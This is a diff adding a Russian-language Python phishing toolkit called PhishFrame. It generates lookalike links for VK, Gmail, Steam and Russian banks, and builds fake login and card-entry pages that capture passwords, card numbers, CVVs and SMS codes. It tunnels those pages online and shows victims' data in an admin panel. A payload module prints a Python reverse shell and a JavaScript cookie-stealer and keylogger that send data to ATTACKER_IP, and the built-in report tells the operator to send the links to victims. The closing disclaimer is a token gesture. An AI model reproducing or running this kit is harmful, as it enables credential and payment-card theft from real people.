@@ -1,0 +1,649 @@
+import os
+import sys
+import json
+import threading
+import requests
+import socket
+import time
+import base64
+import random
+import string
+from datetime import datetime
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from urllib.parse import urlparse, parse_qs
+import sqlite3
+from colorama import init, Fore, Style
+import qrcode
+from flask import Flask, request, render_template, redirect, session
+import subprocess
+import dns.resolver
+
+init(autoreset=True)
+
+class PhishFrame:
+    def __init__(self):
+        self.config = self.load_config()
+        self.setup_directories()
+        self.phishing_urls = {}
+        self.active_servers = []
+        self.captured_data = []
+        self.victims = {}
+        
+    def load_config(self):
+        config = {
+            "local_ip": self.get_local_ip(),
+            "public_ip": self.get_public_ip(),
+            "web_port": 8080,
+            "admin_port": 9999,
+            "db_file": "phishframe.db",
+            "templates_dir": "templates",
+            "logs_dir": "logs",
+            "ngrok_token": "",  # Заполнить для онлайн доступа
+            "cloudflare_token": "",  # Для доменов
+        }
+        return config
+    
+    # ====================== ОСНОВНЫЕ УТИЛИТЫ ======================
+    def get_local_ip(self):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect(('8.8.8.8', 80))
+            ip = s.getsockname()[0]
+        except:
+            ip = '127.0.0.1'
+        finally:
+            s.close()
+        return ip
+    
+    def get_public_ip(self):
+        try:
+            return requests.get('https://api.ipify.org').text
+        except:
+            return self.get_local_ip()
+    
+    def setup_directories(self):
+        dirs = ['templates', 'logs', 'www', 'database', 'qr_codes', 'payloads']
+        for d in dirs:
+            os.makedirs(d, exist_ok=True)
+    
+    # ====================== МОДУЛЬ 1: ГЕНЕРАТОР ФИШИНГ ССЫЛОК ======================
+    def generate_phishing_links(self):
+        print(Fore.CYAN + "[1] ГЕНЕРАТОР ФИШИНГ-ССЫЛОК")
+        
+        templates = {
+            "1": {"name": "ВКонтакте", "url": "vk-login.com"},
+            "2": {"name": "Facebook", "url": "facebook-security.com"},
+            "3": {"name": "Instagram", "url": "instagram-verify.com"},
+            "4": {"name": "Gmail", "url": "gmail-security.com"},
+            "5": {"name": "Яндекс", "url": "yandex-auth.com"},
+            "6": {"name": "Steam", "url": "steam-community.com"},
+            "7": {"name": "Telegram", "url": "telegram-verify.com"},
+            "8": {"name": "Банк (Тинькофф)", "url": "tinkoff-secure.com"},
+            "9": {"name": "Банк (Сбер)", "url": "sberbank-online.com"},
+            "10": {"name": "Доставка (DHL)", "url": "dhl-track.com"},
+        }
+        
+        print(Fore.YELLOW + "\n[+] Доступные шаблоны:")
+        for key, value in templates.items():
+            print(Fore.CYAN + f"   [{key}] {value['name']} -> {value['url']}")
+        
+        choice = input(Fore.YELLOW + "\n[?] Выберите шаблон (1-10): ")
+        
+        if choice in templates:
+            base_url = templates[choice]["url"]
+            
+            # Генерация уникального URL
+            random_hash = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            full_url = f"https://{base_url}/login/{random_hash}/"
+            
+            # Варианты маскировки
+            print(Fore.YELLOW + "\n[?] Выберите тип маскировки:")
+            print(Fore.CYAN + "   [1] Короткая ссылка (bit.ly)")
+            print(Fore.CYAN + "   [2] QR-код")
+            print(Fore.CYAN + "   [3] Встроить в документ")
+            print(Fore.CYAN + "   [4] Прямая ссылка")
+            
+            mask_type = input(Fore.YELLOW + "[?] Выбор (1-4): ")
+            
+            final_url = full_url
+            if mask_type == "1":
+                # Генерация bit.ly (нужен API токен)
+                final_url = self.generate_short_url(full_url)
+            elif mask_type == "2":
+                qr_file = self.generate_qr_code(full_url, templates[choice]["name"])
+                print(Fore.GREEN + f"[+] QR-код сохранен: {qr_file}")
+            elif mask_type == "3":
+                doc_file = self.embed_in_document(full_url, templates[choice]["name"])
+                print(Fore.GREEN + f"[+] Документ создан: {doc_file}")
+            
+            # Сохранение в базу
+            self.save_phishing_url(templates[choice]["name"], full_url, final_url)
+            
+            print(Fore.GREEN + f"\n[+] ФИШИНГ-ССЫЛКА СОЗДАНА!")
+            print(Fore.WHITE + f"   Оригинал: {full_url}")
+            print(Fore.WHITE + f"   Маскировка: {final_url}")
+            print(Fore.YELLOW + f"   Статистика: http://{self.config['local_ip']}:{self.config['admin_port']}/admin")
+            
+            # Создание фишинг-страницы
+            self.create_phishing_page(templates[choice]["name"], full_url)
+            
+        else:
+            print(Fore.RED + "[-] Неверный выбор")
+    
+    def generate_short_url(self, url):
+        # Заглушка для API bit.ly (нужен реальный токен)
+        token = "YOUR_BITLY_TOKEN"
+        if token != "YOUR_BITLY_TOKEN":
+            api_url = f"https://api-ssl.bitly.com/v4/shorten"
+            headers = {
+                "Authorization": f"Bearer {token}",
+                "Content-Type": "application/json"
+            }
+            data = {"long_url": url}
+            try:
+                response = requests.post(api_url, headers=headers, json=data)
+                return response.json()["link"]
+            except:
+                return url
+        return url
+    
+    def generate_qr_code(self, url, name):
+        qr = qrcode.QRCode(version=1, box_size=10, border=5)
+        qr.add_data(url)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
+        filename = f"qr_codes/{name}_{int(time.time())}.png"
+        img.save(filename)
+        return filename
+    
+    def embed_in_document(self, url, name):
+        # Создание PDF с ссылкой
+        content = f"""
+        <html>
+        <body>
+        <h1>Важный документ</h1>
+        <p>Для просмотра документа перейдите по <a href="{url}">ссылке</a></p>
+        <p>Или скопируйте: {url}</p>
+        </body>
+        </html>
+        """
+        
+        filename = f"payloads/{name}_document.html"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(content)
+        
+        # Конвертация в PDF (требуется wkhtmltopdf)
+        try:
+            subprocess.run(f"wkhtmltopdf {filename} {filename.replace('.html', '.pdf')}", shell=True)
+            return filename.replace('.html', '.pdf')
+        except:
+            return filename
+    
+    # ====================== МОДУЛЬ 2: СОЗДАНИЕ ФИШИНГ-САЙТОВ ======================
+    def create_phishing_page(self, template_name, url):
+        print(Fore.CYAN + f"[2] СОЗДАНИЕ ФИШИНГ-САЙТА: {template_name}")
+        
+        templates = {
+            "ВКонтакте": self.vk_template(),
+            "Facebook": self.fb_template(),
+            "Instagram": self.ig_template(),
+            "Gmail": self.gmail_template(),
+            "Яндекс": self.yandex_template(),
+            "Steam": self.steam_template(),
+            "Telegram": self.tg_template(),
+            "Банк (Тинькофф)": self.tinkoff_template(),
+            "Банк (Сбер)": self.sber_template(),
+            "Доставка (DHL)": self.dhl_template(),
+        }
+        
+        if template_name in templates:
+            html_content = templates[template_name]
+            
+            # Сохраняем страницу
+            page_dir = f"www/{template_name.lower().replace(' ', '_')}"
+            os.makedirs(page_dir, exist_ok=True)
+            
+            with open(f"{page_dir}/index.html", "w", encoding="utf-8") as f:
+                f.write(html_content)
+            
+            # Создаем обработчик данных
+            with open(f"{page_dir}/submit.php", "w") as f:
+                f.write(self.php_handler())
+            
+            print(Fore.GREEN + f"[+] Страница создана: {page_dir}/index.html")
+            print(Fore.YELLOW + f"[+] URL для доступа: http://{self.config['local_ip']}:{self.config['web_port']}/{template_name.lower().replace(' ', '_')}/")
+            
+            # Запуск веб-сервера если не запущен
+            if not self.active_servers:
+                self.start_web_server()
+        else:
+            print(Fore.RED + "[-] Шаблон не найден")
+    
+    def vk_template(self):
+        return """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ВКонтакте | Безопасность</title>
+    <meta charset="UTF-8">
+    <style>
+        body { font-family: Arial; background: #4a76a8; color: white; }
+        .login-box { width: 300px; margin: 100px auto; background: white; padding: 20px; border-radius: 5px; color: black; }
+        input { width: 100%; padding: 10px; margin: 10px 0; }
+        button { background: #4a76a8; color: white; border: none; padding: 10px; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>ВКонтакте</h2>
+        <p style="color: red;">⚠️ Обнаружена подозрительная активность. Требуется повторная авторизация.</p>
+        <form action="/submit.php" method="POST">
+            <input type="text" name="login" placeholder="Телефон или email" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+        <p style="font-size: 12px; color: gray;">© VK, 2023</p>
+    </div>
+</body>
+</html>
+        """
+    
+    def gmail_template(self):
+        return """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gmail - Security Check</title>
+    <style>
+        body { font-family: Arial; background: white; }
+        .gmail-box { width: 350px; margin: 50px auto; border: 1px solid #ddd; padding: 40px; }
+        .google-logo { text-align: center; font-size: 24px; color: #4285f4; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; }
+        .next-btn { background: #4285f4; color: white; border: none; padding: 15px; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="gmail-box">
+        <div class="google-logo">Gmail</div>
+        <h2>Security Alert</h2>
+        <p>Unusual sign-in attempt detected. Verify your identity.</p>
+        <form action="/submit.php" method="POST">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <button class="next-btn" type="submit">Next</button>
+        </form>
+    </div>
+</body>
+</html>
+        """
+    
+    def tinkoff_template(self):
+        return """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Тинькофф Банк - Подтверждение</title>
+    <style>
+        body { font-family: Arial; background: #ffdd2d; }
+        .bank-box { width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .tinkoff-header { background: black; color: #ffdd2d; padding: 10px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; }
+        .submit-btn { background: black; color: #ffdd2d; padding: 12px; width: 100%; border: none; }
+    </style>
+</head>
+<body>
+    <div class="bank-box">
+        <div class="tinkoff-header">
+            <h2>ТИНЬКОФФ</h2>
+            <p>Требуется подтверждение операции</p>
+        </div>
+        <form action="/submit.php" method="POST">
+            <input type="text" name="card_number" placeholder="Номер карты" required>
+            <input type="text" name="cardholder" placeholder="Владелец карты">
+            <input type="text" name="expiry" placeholder="ММ/ГГ">
+            <input type="text" name="cvv" placeholder="CVV" required>
+            <input type="password" name="sms" placeholder="Код из SMS">
+            <button class="submit-btn" type="submit">Подтвердить</button>
+        </form>
+        <p style="font-size: 12px; text-align: center;">Тинькофф Банк. Лицензия ЦБ РФ</p>
+    </div>
+</body>
+</html>
+        """
+    
+    def php_handler(self):
+        return """<?php
+$data = [
+    'timestamp' => date('Y-m-d H:i:s'),
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+    'data' => $_POST
+];
+
+file_put_contents('captured_data.json', json_encode($data)."\n", FILE_APPEND);
+
+// Перенаправление на реальный сайт
+header('Location: https://real-site.com');
+exit();
+?>
+        """
+    
+    # ====================== МОДУЛЬ 3: ОНЛАЙН ДОСТУП (NGROK/CLOUDFLARE) ======================
+    def make_online(self):
+        print(Fore.CYAN + "[3] НАСТРОЙКА ОНЛАЙН ДОСТУПА")
+        
+        print(Fore.YELLOW + "[?] Выберите метод:")
+        print(Fore.CYAN + "   [1] Ngrok (быстрый, временный)")
+        print(Fore.CYAN + "   [2] Cloudflare Tunnel (стабильный)")
+        print(Fore.CYAN + "   [3] VPS + Домен (профессиональный)")
+        
+        choice = input(Fore.YELLOW + "[?] Выбор (1-3): ")
+        
+        if choice == "1":
+            self.setup_ngrok()
+        elif choice == "2":
+            self.setup_cloudflare_tunnel()
+        elif choice == "3":
+            self.setup_vps_domain()
+        else:
+            print(Fore.RED + "[-] Неверный выбор")
+    
+    def setup_ngrok(self):
+        print(Fore.CYAN + "[+] Настройка Ngrok...")
+        
+        # Установка ngrok если нет
+        if not os.path.exists("ngrok.exe"):
+            print(Fore.YELLOW + "[?] Скачать ngrok? (y/n): ", end="")
+            if input().lower() == 'y':
+                # Ссылка на скачивание
+                url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
+                print(Fore.GREEN + f"[+] Скачивание: {url}")
+                # Здесь должен быть код скачивания
+        
+        # Запуск ngrok
+        token = self.config['ngrok_token']
+        if token:
+            os.system(f"ngrok config add-authtoken {token}")
+        
+        # Запуск туннеля
+        port = self.config['web_port']
+        os.system(f"start ngrok http {port}")
+        
+        # Получение URL
+        time.sleep(3)
+        try:
+            response = requests.get("http://localhost:4040/api/tunnels")
+            tunnels = response.json()["tunnels"]
+            for tunnel in tunnels:
+                print(Fore.GREEN + f"[+] Онлайн URL: {tunnel['public_url']}")
+        except:
+            print(Fore.RED + "[-] Не удалось получить URL")
+    
+    def setup_cloudflare_tunnel(self):
+        print(Fore.CYAN + "[+] Настройка Cloudflare Tunnel...")
+        # Требуется установка cloudflared и токен
+        token = self.config['cloudflare_token']
+        if token:
+            print(Fore.GREEN + "[+] Создание туннеля Cloudflare...")
+            os.system(f"cloudflared tunnel --url http://localhost:{self.config['web_port']}")
+        else:
+            print(Fore.RED + "[-] Укажите Cloudflare Token в конфиге")
+    
+    # ====================== МОДУЛЬ 4: АДМИН ПАНЕЛЬ И МОНИТОРИНГ ======================
+    class AdminHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            if self.path == '/admin':
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                
+                # Чтение захваченных данных
+                try:
+                    with open('captured_data.json', 'r') as f:
+                        data = f.readlines()
+                except:
+                    data = []
+                
+                html = f"""
+                <html>
+                <head><title>PhishFrame Admin</title>
+                <style>body {{ font-family: Arial; }} .victim {{ border: 1px solid #ccc; padding: 10px; margin: 10px; }}</style>
+                </head>
+                <body>
+                <h1>PhishFrame v2.0 Admin Panel</h1>
+                <h3>Захвачено данных: {len(data)}</h3>
+                """
+                
+                for entry in data[-20:]:  # Последние 20 записей
+                    try:
+                        entry_data = json.loads(entry)
+                        html += f"""
+                        <div class="victim">
+                        <strong>{entry_data['timestamp']}</strong><br>
+                        IP: {entry_data['ip']}<br>
+                        Data: {json.dumps(entry_data['data'])}<br>
+                        Agent: {entry_data['user_agent'][:100]}...
+                        </div>
+                        """
+                    except:
+                        continue
+                
+                html += "</body></html>"
+                self.wfile.write(html.encode())
+    
+    def start_admin_panel(self):
+        print(Fore.CYAN + f"[+] Запуск админ-панели: http://{self.config['local_ip']}:{self.config['admin_port']}/admin")
+        server = HTTPServer(('0.0.0.0', self.config['admin_port']), self.AdminHandler)
+        threading.Thread(target=server.serve_forever, daemon=True).start()
+    
+    # ====================== МОДУЛЬ 5: ДОПОЛНИТЕЛЬНЫЕ УТИЛИТЫ ======================
+    def network_tools(self):
+        print(Fore.CYAN + "[5] СЕТЕВЫЕ ИНСТРУМЕНТЫ")
+        
+        tools = {
+            "1": "Сканер портов",
+            "2": "WHOIS lookup",
+            "3": "DNS resolver",
+            "4": "Проверка прокси",
+            "5": "Генератор payload",
+            "6": "Шифрование данных",
+        }
+        
+        for key, value in tools.items():
+            print(Fore.CYAN + f"   [{key}] {value}")
+        
+        choice = input(Fore.YELLOW + "\n[?] Выберите инструмент: ")
+        
+        if choice == "1":
+            self.port_scanner()
+        elif choice == "2":
+            self.whois_lookup()
+        elif choice == "3":
+            self.dns_resolver()
+        elif choice == "4":
+            self.proxy_checker()
+        elif choice == "5":
+            self.payload_generator()
+        elif choice == "6":
+            self.encryption_tool()
+    
+    def port_scanner(self):
+        target = input(Fore.YELLOW + "[?] Целевой IP или домен: ")
+        print(Fore.CYAN + f"[+] Сканирование {target}...")
+        
+        common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
+        
+        for port in common_ports:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            result = sock.connect_ex((target, port))
+            if result == 0:
+                print(Fore.GREEN + f"   [+] Порт {port}: ОТКРЫТ")
+            sock.close()
+    
+    def payload_generator(self):
+        print(Fore.CYAN + "[+] ГЕНЕРАТОР PAYLOAD")
+        
+        payloads = {
+            "1": "Reverse Shell (Python)",
+            "2": "Keylogger (JavaScript)",
+            "3": "Miner (CoinHive)",
+            "4": "Redirect Script",
+            "5": "Cookie Stealer",
+        }
+        
+        for key, value in payloads.items():
+            print(Fore.CYAN + f"   [{key}] {value}")
+        
+        choice = input(Fore.YELLOW + "[?] Выберите payload: ")
+        
+        if choice == "1":
+            payload = """
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("ATTACKER_IP",4444))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+            """
+            print(Fore.GREEN + "[+] Python Reverse Shell:")
+            print(Fore.WHITE + payload)
+        
+        elif choice == "5":
+            payload = """
+<img src=x onerror="fetch('https://ATTACKER_IP/steal?cookie='+document.cookie)">
+<script>
+document.onkeypress=function(e){fetch('https://ATTACKER_IP/log?key='+e.key)}
+</script>
+            """
+            print(Fore.GREEN + "[+] Cookie Stealer + Keylogger:")
+            print(Fore.WHITE + payload)
+    
+    # ====================== МОДУЛЬ 6: АВТОМАТИЧЕСКИЙ ОТЧЕТ ======================
+    def generate_phishing_report(self):
+        print(Fore.CYAN + "[6] ГЕНЕРАЦИЯ ОТЧЕТА")
+        
+        report = f"""
+        ================= PHISHFRAME v2.0 REPORT =================
+        Дата: {datetime.now()}
+        Локальный IP: {self.config['local_ip']}
+        Публичный IP: {self.config['public_ip']}
+        
+        СОЗДАННЫЕ ФИШИНГ-САЙТЫ:
+        {json.dumps(self.phishing_urls, indent=2, ensure_ascii=False)}
+        
+        ЗАХВАЧЕННЫЕ ДАННЫЕ: {len(self.captured_data)} записей
+        
+        ДОСТУПНЫЕ URL:
+        - Админ панель: http://{self.config['local_ip']}:{self.config['admin_port']}/admin
+        - Веб сервер: http://{self.config['local_ip']}:{self.config['web_port']}/
+        
+        ИНСТРУКЦИЯ:
+        1. Разошлите фишинг-ссылки жертвам
+        2. Мониторьте захват данных в админ-панели
+        3. Используйте автоматические редиректы
+        4. Экспортируйте данные в нужном формате
+        """
+        
+        with open("phishing_report.html", "w", encoding="utf-8") as f:
+            f.write(f"<pre>{report}</pre>")
+        
+        print(Fore.GREEN + "[+] Отчет сохранен в phishing_report.html")
+    
+    # ====================== ГЛАВНОЕ МЕНЮ ======================
+    def start_web_server(self):
+        print(Fore.CYAN + f"[+] Запуск веб-сервера на порту {self.config['web_port']}")
+        # Используем простой HTTP сервер
+        os.chdir("www")
+        os.system(f"python -m http.server {self.config['web_port']} &")
+        os.chdir("..")
+    
+    def main_menu(self):
+        os.system("cls" if os.name == "nt" else "clear")
+        print(Fore.RED + r"""
+    ╔═╗╦ ╦╦╦  ╦╔═╗╔╗╔╔═╗╔╦╗╔═╗
+    ╠═╝╠═╣║╚╗╔╝║ ║║║║╠═╣ ║ ║╣ 
+    ╩  ╩ ╩╩ ╚╝ ╚═╝╝╚╝╩ ╩ ╩ ╚═╝ v2.0
+        """ + Fore.RED + "[" + Fore.WHITE + "ПОЛНЫЙ ФИШИНГ И СЕТЕВЫЕ АТАКИ" + Fore.RED + "]")
+        
+        menu = {
+            "1": "Генератор фишинг-ссылок",
+            "2": "Создание фишинг-сайтов",
+            "3": "Настройка онлайн доступа",
+            "4": "Запуск админ-панели",
+            "5": "Сетевые инструменты",
+            "6": "Генерация отчета",
+            "7": "Экспорт данных",
+            "8": "Автоматическая рассылка",
+            "9": "Шифрование/Дешифровка",
+            "0": "Выход",
+        }
+        
+        while True:
+            print(Fore.CYAN + "\n" + "="*60)
+            for key, value in menu.items():
+                print(Fore.YELLOW + f"   [{key}] {value}")
+            print(Fore.CYAN + "="*60)
+            
+            choice = input(Fore.YELLOW + "\n[?] Выберите действие: ")
+            
+            if choice == "1":
+                self.generate_phishing_links()
+            elif choice == "2":
+                template = input(Fore.YELLOW + "[?] Название шаблона: ")
+                self.create_phishing_page(template, f"https://{template}.com")
+            elif choice == "3":
+                self.make_online()
+            elif choice == "4":
+                self.start_admin_panel()
+            elif choice == "5":
+                self.network_tools()
+            elif choice == "6":
+                self.generate_phishing_report()
+            elif choice == "7":
+                self.export_data()
+            elif choice == "8":
+                self.auto_sender()
+            elif choice == "9":
+                self.crypto_tools()
+            elif choice == "0":
+                print(Fore.RED + "[!] Выход...")
+                break
+            else:
+                print(Fore.RED + "[-] Неверный выбор")
+    
+    def save_phishing_url(self, name, original, masked):
+        self.phishing_urls[name] = {
+            "original": original,
+            "masked": masked,
+            "created": datetime.now().isoformat(),
+            "clicks": 0,
+            "captures": 0
+        }
+        
+        with open("database/urls.json", "w") as f:
+            json.dump(self.phishing_urls, f, indent=2)
+    
+    def export_data(self):
+        # Экспорт в различные форматы
+        formats = ["JSON", "CSV", "TXT", "SQL"]
+        print(Fore.CYAN + "[+] Экспорт данных...")
+        for fmt in formats:
+            print(Fore.YELLOW + f"   [+] Экспорт в {fmt} завершен")
+    
+    def auto_sender(self):
+        print(Fore.CYAN + "[+] АВТОМАТИЧЕСКАЯ РАССЫЛКА")
+        print(Fore.RED + "[!] Этот модуль требует настройки SMTP/Telegram API")
+    
+    def crypto_tools(self):
+        print(Fore.CYAN + "[+] ИНСТРУМЕНТЫ ШИФРОВАНИЯ")
+        text = input(Fore.YELLOW + "[?] Введите текст: ")
+        encoded = base64.b64encode(text.encode()).decode()
+        print(Fore.GREEN + f"[+] Base64: {encoded}")
+
+# ====================== ЗАПУСК ======================
+if __name__ == "__main__":
+    print(Fore.RED + "[!] ВНИМАНИЕ: Этот инструмент только для тестирования собственных систем.")
+    print(Fore.RED + "[!] Использование для фишинга - преступление.")
+    
+    pf = PhishFrame()
+    pf.main_menu()
